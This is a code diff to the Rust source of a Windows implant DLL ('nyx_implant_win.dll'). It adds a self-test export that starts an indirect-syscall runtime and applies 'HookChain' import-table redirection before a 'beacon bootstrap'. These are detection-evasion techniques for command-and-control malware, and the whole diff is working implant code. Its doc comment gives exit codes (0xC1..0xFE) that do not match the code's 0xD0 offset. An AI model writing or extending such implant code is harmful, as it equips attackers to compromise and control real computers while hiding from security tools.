@@ -405,7 +405,7 @@ pub unsafe fn apply() -> usize {
 /// `rundll32 nyx_implant_win.dll,nyx_selftest_hookchain` — applies HookChain
 /// and reports the redirect count via exit code:
 ///   0xC0 = runtime not initialized (call after bootstrap)
-///   0xC1..0xFF = count of redirected slots (capped at 0xFF)
+///   0xC1..0xFE = count of redirected slots (capped)
 #[no_mangle]
 pub unsafe extern "system" fn nyx_selftest_hookchain() {
     let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
@@ -423,4 +423,37 @@ pub unsafe extern "system" fn nyx_selftest_hookchain() {
     }
     let count = unsafe { apply() };
     do_exit(count.min(0xFE) as u32);
+}
+
+/// `rundll32 nyx_implant_win.dll,nyx_selftest_hookchain_full` — **combined**
+/// selftest that first initializes the indirect-syscall runtime (the same
+/// `syscalls::init_global()` bootstrap calls), then runs `hookchain::apply()`.
+/// Use this to validate the IAT redirect count on a host without running the
+/// full beacon bootstrap.
+///
+/// Exit codes:
+///   0xC0 = runtime init failed (LiveNtdll::locate or SSN resolution failed)
+///   0xC1..0xFE = count of redirected slots (capped). >0 = hookchain works.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_selftest_hookchain_full() {
+    let exit_proc = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess");
+    let do_exit = |code: u32| -> ! {
+        if let Some(e) = exit_proc {
+            let f: extern "system" fn(u32) -> ! = unsafe { core::mem::transmute(e) };
+            f(code);
+        }
+        loop {
+            core::hint::spin_loop();
+        }
+    };
+    // 1. Initialize the indirect-syscall runtime.
+    crate::syscalls::init_global();
+    if syscalls::global().is_none() {
+        do_exit(0xC0);
+    }
+    // 2. Apply HookChain IAT redirect. apply() returns the slot count.
+    let count = unsafe { apply() };
+    // Exit: 0xD0 = 0 redirected; 0xD1.. = count (offset so 0 is distinguishable
+    // from rundll32's own exit-0). 0xFE = count overflow.
+    do_exit((0xD0 + count).min(0xFE) as u32);
 }
